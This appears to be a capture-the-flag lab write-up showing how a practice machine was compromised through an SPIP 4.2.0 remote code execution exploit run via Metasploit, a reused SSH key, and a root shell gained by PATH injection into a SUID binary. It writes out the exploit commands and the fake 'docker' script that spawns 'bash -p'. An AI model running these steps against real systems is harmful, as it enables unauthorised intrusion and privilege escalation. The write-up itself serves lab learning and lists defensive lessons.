Recon

Started with a standard Nmap scan.

bash
nmap -sV -sC 10.10.248.7
22SSH
80HTTP

Port 80 served what looked like a normal website.

Web Enumeration

Ran gobuster to find hidden paths.

bash
gobuster dir -u http://10.10.248.7 -w /usr/share/wordlists/dirb/common.txt
Found
  • http://10.10.248.7/spip/ — SPIP CMS installation
  • http://10.10.248.7/spip/ecrire — admin login panel
  • http://10.10.248.7/spip/tmp/log/auth.log — no secret key, all passwords invalidated
  • http://10.10.248.7/spip/local/config.txt — reveals SPIP version 4.2.0

With the version confirmed, ran searchsploit and found a known RCE vulnerability for SPIP 4.2.0.

bash
searchsploit spip 4.2

Foothold — SPIP RCE

A public Python exploit existed for this version, but it failed despite having a valid CSRF token. Two issues surfaced:

  • The CSRF token is tied to the user session, so the URL in the script needed to match the redirect target of /spip/ecrire, not the base path.
  • A second server-side filter kept rejecting the payload — /tmp/spip.log showed ERREUR: signature ajax form incorrecte : oubli (encodage corrompu).

Switched to Metasploit, which handled the form encoding correctly. Also cross-referenced the exploit base code to fix the FORM_PAGE path.

bash
msfconsole
use exploit/unix/webapp/spip_rce_form
set RHOSTS 10.10.248.7
set TARGETURI /spip
run
Got a webshell

Metasploit landed a session. Upgraded to a proper interactive shell from there.

Stable Shell — SSH Key Exfiltration

Found an SSH private key for the user think on the machine.

bash
# Read the key from the victim, save it locally
chmod 600 think_id_rsa
ssh -i think_id_rsa think@10.10.248.7
Full interactive shell as think

Privilege Escalation — PATH Injection via SUID

Started enumeration looking for SUID binaries.

bash
find / -perm -4000 2>/dev/null
Found unusual SUID binary

/usr/sbin/run_container — not a standard system binary.

The binary lives under /opt, which AppArmor blocked from listing. Checked the AppArmor profile to understand what was restricted and what wasn't.

AppArmor analysis

The profile denied listing /opt but explicitly allowed writes to /var/tmp. Direct reads of known paths still worked, so /opt/run_container.sh was readable even without being able to list the directory.

Reading the script revealed that it calls docker without an absolute path, just the bare command name. This is a classic PATH injection target.

bash
# Prepend /var/tmp to PATH
export PATH=/var/tmp:$PATH

# Create a malicious "docker" script in /var/tmp
echo '/bin/bash -p' > /var/tmp/docker
chmod +x /var/tmp/docker

# Run the SUID binary
/usr/sbin/run_container
Root shell

The SUID binary executed our fake docker with elevated privileges. bash -p preserved them, dropping us into a root shell.

Takeaways

Key lessons
  • Version disclosure in config files (config.txt, log files) is often the fastest path to a known CVE
  • When a public exploit fails, check the actual server error logs. /tmp/spip.log told us exactly what the filter rejected
  • AppArmor restricts listing but not necessarily reading, knowing a full path is enough to access a file
  • SUID binaries calling commands without absolute paths are PATH injection targets, always check the source script
  • bash -p preserves SUID privileges; without it, bash would drop them on startup
